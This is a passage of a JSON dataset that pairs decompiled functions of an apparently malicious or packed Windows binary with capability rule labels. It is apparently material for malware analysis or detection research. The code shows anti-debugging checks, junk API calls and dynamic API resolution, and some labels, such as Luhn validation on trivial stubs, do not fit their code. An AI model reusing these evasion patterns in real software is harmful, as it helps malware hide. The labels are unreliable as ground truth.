            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408a05(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x422ce8 ^ &stack0xfffffffc;\n    fcn.00403f49(arg_10h);\n    var_14h = fcn.0040cd00(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c278(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00408a5e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00408a9e;\n        }\n        if (iVar1 != 2) {\ncode_r0x00408a90:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00408a9e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00408a90;\n        goto code_r0x00408a5e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00408a9e:\n    fcn.004091cf(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "00408aad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408aad(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x422ce8 ^ &stack0xfffffffc;\n    fcn.00403f49(arg_10h);\n    var_14h = fcn.0040cd00(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c7bc(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00408b06:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00408b46;\n        }\n        if (iVar1 != 2) {\ncode_r0x00408b38:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00408b46;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00408b38;\n        goto code_r0x00408b06;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00408b46:\n    fcn.004091cf(unaff_EBX);\n    return;\n}\n",
        "token_count": 502
    },
    "004091cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004091cf(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x422ce8) {\n        return;\n    }\n    *0x43dad0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x43dad4 = &arg_8h;\n    *0x43da10 = 0x10001;\n    *0x43d9b8 = 0xc0000409;\n    *0x43d9bc = 1;\n    var_328h = *0x422ce8;\n    var_324h = *0x422cec;\n    *0x43d9c4 = unaff_retaddr;\n    *0x43da9c = in_GS;\n    *0x43daa0 = in_FS;\n    *0x43daa4 = in_ES;\n    *0x43daa8 = in_DS;\n    *0x43daac = unaff_EDI;\n    *0x43dab0 = unaff_ESI;\n    *0x43dab4 = unaff_EBX;\n    *0x43dab8 = in_EDX;\n    *0x43dabc = in_ECX;\n    *0x43dac0 = in_EAX;\n    *0x43dac4 = unaff_EBP;\n    *0x43dac8 = unaff_retaddr;\n    *0x43dacc = in_CS;\n    *0x43dad8 = in_SS;\n    *0x43da08 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b145(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402764);\n    if (*0x43da08 == 0) {\n        fcn.0040b145(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 835
    },
    "004095aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004095aa(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409688(0);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0040b14d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b14d(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00404ce7();\n    var_4h = 0;\n    if (*0x43d994 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401e00);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401df4);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x43d994 = fcn.00404c75(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401de4);\n        *0x43d998 = fcn.00404c75(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401dd0);\n        *0x43d99c = fcn.00404c75(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401db4);\n        *0x43d9a4 = fcn.00404c75(uVar3);\n        if (*0x43d9a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401d9c);\n            *0x43d9a0 = fcn.00404c75(uVar3);\n        }\n    }\n    if ((*0x43d9a0 != iVar1) && (*0x43d9a4 != iVar1)) {\n        pcVar4 = fcn.00404cf0(*0x43d9a0);\n        pcVar5 = fcn.00404cf0(*0x43d9a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040b28f;\n        }\n    }\n    if ((((*0x43d998 != iVar1) && (pcVar4 = fcn.00404cf0(*0x43d998),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x43d99c != iVar1 && (pcVar4 = fcn.00404cf0(*0x43d99c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040b28f:\n    pcVar4 = fcn.00404cf0(*0x43d994);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 850
    },
    "0040ee0d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ee0d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405214(0x4122c8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040692b();\n        *puVar2 = 0;\n        puVar2 = fcn.00406918();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x43ddb8)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x43ddc0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040fcad(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00406918();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040692b();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040e6da(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040eedf(0x4122c8);\n                goto code_r0x0040eed9;\n            }\n        }\n        puVar2 = fcn.0040692b();\n        *puVar2 = 0;\n        puVar2 = fcn.00406918();\n        *puVar2 = 9;\n        fcn.004068b0(0, 0, 0, 0, 0);\n    }\ncode_r0x0040eed9:\n    fcn.00405259();\n    return;\n}\n",
        "token_count": 632
    },
    "00402960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402960(uint *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h;\n    return;\n}\n",
        "token_count": 54
    },
    "00402c1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402c1c(void)\n\n{\n    *0x43c9c0 = *0x43c9c0 + 0x3b17;\n    return;\n}\n",
        "token_count": 43
    },
    "00402d3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402d3c(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t latency;\n    uint lpStruct;\n    uint lpBuffer;\n    uint lpszVolumeName;\n    uint hEvent;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint ListHead;\n    uint var_10h;\n    uint lpAttribute;\n    uint lpNumberOfEventsWritten;\n    int32_t dwWriteCoord;\n    \n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x13e6) {\n            *0x43ce14 = *0x43ce14 + 0x38d6;\n        }\n        if (*0x43ce14 == 0xbc4) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x31a652);\n    fcn.00402d28();\n    latency = 0;\n    if (*0x43ce14 != 0) {\n        do {\n            fcn.00402b17(latency);\n            if (*0x43ce14 == 0x29) {\n                (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0, 0, 0, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(&dwWriteCoord);\n            }\n            latency = latency + 1;\n        } while (latency < *0x43ce14);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumCalendarInfoW;\n    pcVar1 = _sym.imp.KERNEL32.dll_MoveFileA;\n    dwWriteCoord = 0x91973a;\n    do {\n        if (*0x43ce14 == 0x465) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthA)();\n            (*pcVar2)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleMode)(0, 0);\n            (*pcVar2)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(&var_1ch);\n            (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)(&var_18h, 0);\n            (*_sym.imp.KERNEL32.dll_ConvertThreadToFiber)(0);\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)(0, 0, &lpStruct, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleSelectionInfo)(&var_2ch);\n            (*_sym.imp.KERNEL32.dll_FindResourceW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_InitAtomTable)(0);\n            (*_sym.imp.KERNEL32.dll_WriteConsoleInputA)(0, 0, 0, &lpNumberOfEventsWritten);\n            (*_sym.imp.KERNEL32.dll_SetCommState)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GlobalCompact)(0);\n            (*_sym.imp.KERNEL32.dll_LocalReAlloc)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0);\n            (*pcVar1)(0, 0);\n            (*_sym.imp.KERNEL32.dll_LocalCompact)(0);\n            (*_sym.imp.KERNEL32.dll_SetEvent)(&hEvent);\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)(0, &lpBuffer);\n            (*pcVar1)(0x401304, 0x4012f8);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CopyFileA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(0);\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExW)(0, 0, 0, 0, &lpAttribute);\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionA)(0, 0, 0);\n            ListHead = 0;\n            var_10h = 0;\n            (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(&ListHead);\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpszVolumeName, 0);\n        }\n        dwWriteCoord = dwWriteCoord + -1;\n    } while (dwWriteCoord != 0);\n    if (*0x43ce14 == 0xc) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(&lpszVolumeName, 0x401318, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_TerminateJobObject)(0, lpNumberOfEventsWritten);\n        (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(0x40135c);\n        (*_sym.imp.KERNEL32.dll_ClearCommError)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetConsoleTitleW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)(&lpNumberOfEventsWritten, 0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(0);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0);\n        (*_sym.imp.KERNEL32.dll_AddAtomA)(0);\n        (*pcVar1)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)(0, 0);\n        (*_sym.imp.KERNEL32.dll_ZombifyActCtx)(0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    }\n    iVar3 = 0;\n    do {\n        if (*0x43ce14 == 0x92) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n        }\n        if (iVar3 == 0xa9a9) {\n            *0x43ce10 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x423bc8);\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x25563);\n    *0x423bc8 = 0;\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x148) {\n            fcn.00402c2a();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x427fa7);\n    fcn.00402ab0(*0x43c9c0, *0x43ce14, 0x413010);\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFlags;\n    iVar3 = 0;\n    do {\n        if (*0x43ce14 == 0xba) {\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0);\n        }\n        (*pcVar1)(0);\n        if (iVar3 == 0x2f7e4) {\n            fcn.00402c1c();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x48122);\n    fcn.004028bc();\n    if (*0x43ce14 == 0x58c) {\n        (*pcVar1)(0);\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeA)(&lpszVolumeName, 0);\n        (*_sym.imp.KERNEL32.dll_GetConsoleSelectionInfo)(0);\n        dwWriteCoord = 0;\n        (*_sym.imp.KERNEL32.dll_WriteConsoleOutputAttribute)(0, &lpAttribute, 0, 0, &lpNumberOfEventsWritten);\n        (*_sym.imp.KERNEL32.dll_CreateJobObjectA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x401370);\n        (*_sym.imp.KERNEL32.dll_FindResourceW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)(0, lpNumberOfEventsWritten, 0);\n        (*_sym.imp.KERNEL32.dll_ChangeTimerQueueTimer)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0);\n    }\n    fcn.00402c16();\n    return 0;\n}\n",
        "token_count": 2052
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    uint32_t uVar1;\n    int32_t var_90h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    do {\n        if (uVar1 < 0x1c865) {\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n    } while (((uVar1 < 0x1e974290) || (var_90h == 0xad642ec)) && (uVar1 = uVar1 + 1,  uVar1 < 0x8e2a75d8));\n    if (*0x43ce14 == 0x9e) {\n        fcn.00403933(0, 0);\n        fcn.004028a0(0);\n        fcn.00403933(0, 0x401380);\n        fcn.0040ff74(0);\n        fcn.0040391c(0);\n        fcn.004037ab();\n    }\n    *0x43ce14 = *0x4132e4;\n    *0x43d228 = *0x413008;\n    fcn.00402d3c();\n    return 0;\n}\n",
        "token_count": 457
    },
    "00403933": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00403933(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00405214(0x411fc8, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00406918();\n        *puVar1 = 0x16;\n        fcn.004068b0(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.004058b6();\n        fcn.004059ce(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004058b6();\n        arg_8h_00 = fcn.00405a6b(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004058b6();\n        uVar4 = fcn.00405be1(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004058b6();\n        fcn.00405b07(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004039cf();\n    }\n    fcn.00405259();\n    return;\n}\n",
        "token_count": 458
    },
    "004039cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004039cf(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004058b6();\n    fcn.00405a3c(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 55
    },
    "0040581e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040581e(uint arg_8h)\n\n{\n    fcn.004056f2(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004072c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004072dd)\n// WARNING: Removing unreachable block (ram,0x004072e3)\n// WARNING: Removing unreachable block (ram,0x004072e5)\n\nvoid fcn.004072c9(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "0040fde1": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040fde1(void)\n\n{\n    *0x423ba4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x4027ac, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "00402b17": {
        "rules": [
            "connect pipe",
            "read pipe",
            "write pipe",
            "get disk information",
            "create directory",
            "get common file path",
            "move file",
            "create mailslot"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nvoid __cdecl fcn.00402b17(int32_t latency)\n\n{\n    uint lpszVolumeMountPoint;\n    uint lpOutBuffer;\n    uint var_c20h;\n    uint var_820h;\n    uint lpBuffer;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint *puStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint lpBytesRead;\n    uint lpNumberOfEventsRead;\n    uint lpFilePart;\n    \n    lpFilePart = 0x402b24;\n    fcn.00403780();\n    if (*0x43ce14 == 0x37) {\n        lpNumberOfEventsRead = 0;\n        lpBytesRead = 0;\n        uStack20 = 0;\n        uStack24 = 0x402b3d;\n        (*_sym.imp.KERNEL32.dll_CommConfigDialogW)();\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = 0;\n        var_20h = 0;\n        uStack40 = 0x402b47;\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)();\n        uStack40 = 0;\n        uStack44 = 0;\n        puStack48 = 0x402b4f;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n        puStack48 = &fcn.00402b17::lpBuffer;\n        uStack52 = 0;\n        uStack56 = 0x402b5d;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryA)();\n        uStack56 = 0;\n        puStack60 = &fcn.00402b17::lpBytesRead;\n        uStack64 = 0;\n        puStack68 = &fcn.00402b17::lpOutBuffer;\n        uStack72 = 0;\n        uStack76 = 0;\n        uStack80 = 0x4012ec;\n        uStack84 = 0x402b77;\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)();\n        uStack84 = 0;\n        uStack88 = 0;\n        puStack92 = 0x402b7f;\n        (*_sym.imp.KERNEL32.dll_MoveFileA)();\n        puStack92 = &fcn.00402b17::lpFilePart;\n        puStack96 = &fcn.00402b17::var_820h;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0;\n        uStack112 = 0;\n        uStack116 = 0x402b94;\n        (*_sym.imp.KERNEL32.dll_SearchPathA)();\n        uStack116 = 0;\n        puStack120 = &fcn.00402b17::lpszVolumeMountPoint;\n        uStack124 = 0;\n        puStack128 = 0x402ba3;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointW)();\n        puStack128 = &fcn.00402b17::lpNumberOfEventsRead;\n        uStack132 = 0;\n        puStack136 = &fcn.00402b17::var_20h;\n        uStack140 = 0;\n        puStack144 = 0x402bb3;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputW)();\n        puStack144 = &fcn.00402b17::var_c20h;\n        uStack148 = 0;\n        uStack152 = 0x402bc1;\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n        uStack152 = 0;\n        uStack156 = 0;\n        uStack160 = 0;\n        uStack164 = 0x402bca;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack164 = 0x4012f4;\n        uStack168 = 0x402bd5;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        uStack168 = 0;\n        uStack172 = 0;\n        uStack176 = 0;\n        uStack180 = 0;\n        iStack184 = 0x402bdf;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasA)();\n        iStack184 = latency;\n        uStack188 = 0x402be8;\n        (*_sym.imp.KERNEL32.dll_RequestWakeupLatency)();\n        uStack188 = 0;\n        uStack192 = 0;\n        uStack196 = 0;\n        uStack200 = 0;\n        uStack204 = 0x402bf2;\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n        uStack204 = 0x402bf8;\n        (*_sym.imp.KERNEL32.dll_AreFileApisANSI)();\n    }\n    *(*0x43c9c0 + latency) = *(*0x43d228 + 0x38d6 + latency);\n    return;\n}\n",
        "token_count": 1355
    },
    "0040ff74": {
        "rules": [
            "delete file"
        ],
